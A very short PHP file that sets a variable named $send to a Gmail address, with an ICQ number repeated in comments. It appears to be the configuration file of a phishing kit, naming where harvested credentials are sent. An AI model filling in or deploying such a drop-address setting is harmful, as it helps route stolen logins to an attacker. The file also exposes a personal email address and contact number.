<?php
//ICQ670486322
$send = "d39bell@gmail.com";
//ICQ670486322
?>